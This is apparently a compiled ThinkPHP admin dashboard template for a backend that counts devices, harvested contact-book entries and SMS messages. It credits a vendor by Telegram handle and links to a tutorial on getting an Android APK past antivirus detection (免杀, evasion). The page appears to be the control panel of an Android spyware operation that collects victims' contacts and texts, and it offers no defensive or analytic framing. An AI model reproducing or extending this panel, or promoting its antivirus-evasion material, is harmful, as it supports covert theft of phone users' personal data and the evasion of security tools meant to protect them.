<?php if (!defined('THINK_PATH')) exit(); /*a:1:{s:66:"/www/wwwroot/20.187.70.78/public/../app/admin/view/main/index.html";i:1657783931;}*/ ?>
<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>ui</title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">	
		<link href="http://txl.cloudbing.online/ui/css/perfect-scrollbar.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/metisMenu.min.css" rel="stylesheet"><!-- Bootstrap CSS -->
		<link href="http://txl.cloudbing.online/ui/css/bootstrap.min.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/bootstrap-extended.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/style.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/icons.css" rel="stylesheet">
		<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet">
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css"><!-- loader-->
		<link href="http://txl.cloudbing.online/ui/css/pace.min.css" rel="stylesheet">
		<!--Theme Styles-->
		<link href="http://txl.cloudbing.online/ui/css/dark-theme.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/light-theme.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/semi-dark.css" rel="stylesheet">
		<link href="http://txl.cloudbing.online/ui/css/header-colors.css" rel="stylesheet">
		 
  <link rel="stylesheet" href="/static/public/layui/css/layui.css" media="all">
  <link rel="stylesheet" href="/static/public/font-awesome/css/font-awesome.min.css" media="all">
  
  <div class="layui-row layui-col-space15">
    <div class="layui-col-md8">
      <div class="layui-row layui-col-space15">
        <div class="layui-col-md12">

          <div class="layui-card">            
            <div class="layui-card-header"></div>
            <div class="layui-card-body">
<div class="col">
						<div class="card overflow-hidden radius-10">
							<div class="card-body p-2">
								<div class="d-flex align-items-stretch justify-content-between radius-10 overflow-hidden">
									<div class="w-50 p-3 bg-light-primary">
<p>快科技  TG✈️ <a class="text-primary" href="https://t.me/shiguang2023" target="_blank">@shiguang2023</a> 由快科技提供技术支持</p>
	</div>
		<div class="w-50 p-3 bg-light-primary">
<a class="text-primary" href="http://txlcs.cloudbing.online/apk.html" target="_blank">安卓APK报毒处理教程下载（免杀方案教学）</a>
								</div>
							</div>
						</div></div>
					<div class="col">
						<div class="card overflow-hidden radius-10">
							<div class="card-body p-2">
								<div class="d-flex align-items-stretch justify-content-between radius-10 overflow-hidden">
									<div class="w-50 p-3 bg-light-primary">
										<p>设备</p>
										<h4 class="text-primary"><?php echo $web['mobileuser']; ?>个</h4>
									</div>
									<div class="w-50 bg-primary p-3">
										<p class="mb-3 text-white">操作系统：<?php echo $info['win']; ?> </i>
										</p>
										<div id="chart1"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col">
						<div class="card overflow-hidden radius-10">
							<div class="card-body p-2">
								<div class="d-flex align-items-stretch justify-content-between radius-10 overflow-hidden">
									<div class="w-50 p-3 bg-light-primary">
										<p>通讯录</p>
										<h4 class="text-primary"><?php echo $web['mobile']; ?>个</h4>
									</div>
									<div class="w-50 bg-primary p-3">
										<p class="mb-3 text-white">PHP版本：<?php echo $info['php']; ?></i>
										</p>
										<div id="chart2"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col">
						<div class="card overflow-hidden radius-10">
							<div class="card-body p-2">
								<div class="d-flex align-items-stretch justify-content-between radius-10 overflow-hidden">
									<div class="w-50 p-3 bg-light-primary">
										<p>管理员</p>
										<h4 class="text-primary"><?php echo $web['user_num']; ?>个</h4>
									</div>
									<div class="w-50 bg-primary p-3">
										<p class="mb-3 text-white">运行环境：<?php echo $info['environment']; ?></i>
										</p>
										<div id="chart3"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col">
						<div class="card overflow-hidden radius-10">
							<div class="card-body p-2">
								<div class="d-flex align-items-stretch justify-content-between radius-10 overflow-hidden">
									<div class="w-50 p-3 bg-light-primary">
										<p>短信</p>
										<h4 class="text-primary"><?php echo $web['smsnum']; ?>条</h4>
									</div>
									<div class="w-50 bg-primary p-3">
										<p class="mb-3 text-white">剩余空间大小：<?php if(!(empty($info['disk']) || (($info['disk'] instanceof \think\Collection || $info['disk'] instanceof \think\Paginator ) && $info['disk']->isEmpty()))): ?><?php echo $info['disk']; else: ?>未知<?php endif; ?></i>
										</p>
										<div id="chart4"></div>
									</div>
								</div>
							</div>
						</div>
					